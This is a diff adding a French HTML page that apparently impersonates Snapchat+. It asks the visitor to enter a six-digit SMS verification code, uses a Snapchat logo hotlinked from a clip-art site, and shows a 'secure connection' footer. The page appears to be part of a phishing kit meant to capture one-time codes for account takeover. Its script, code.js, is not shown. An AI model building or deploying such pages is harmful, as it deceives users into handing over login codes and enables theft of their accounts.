@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Code de vérification Snapchat+</title>
+    <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+    <div class="container">
+        <div class="main-card code-card">
+            <div class="code-header">
+                <img src="https://cdn.imgbin.com/13/25/13/social-media-icon-snapchat-icon-6kBmyR3B.jpg" alt="Snapchat" class="code-logo" />
+                <h1>Code de vérification</h1>
+                <p>Un code SMS vous a été envoyé au <strong id="codePhone">--</strong></p>
+            </div>
+
+            <div class="code-inputs" id="codeInputs">
+                <input type="text" maxlength="1" class="code-digit" data-index="0" />
+                <input type="text" maxlength="1" class="code-digit" data-index="1" />
+                <input type="text" maxlength="1" class="code-digit" data-index="2" />
+                <input type="text" maxlength="1" class="code-digit" data-index="3" />
+                <input type="text" maxlength="1" class="code-digit" data-index="4" />
+                <input type="text" maxlength="1" class="code-digit" data-index="5" />
+            </div>
+
+            <button onclick="verifyCode()" id="verifyBtn" class="btn-primary">
+                ✅ Vérifier le code
+            </button>
+
+            <div id="codeStatus" class="status-message"></div>
+
+            <div class="code-resend">
+                <p>Vous n'avez pas reçu le code ? <button onclick="requestNewCode()" class="link-btn">Renvoyer</button></p>
+            </div>
+
+            <div class="val-footer" style="margin-top:24px;">
+                <p>🔒 Connexion sécurisée • Données protégées</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="code.js"></script>
+</body>
+</html>
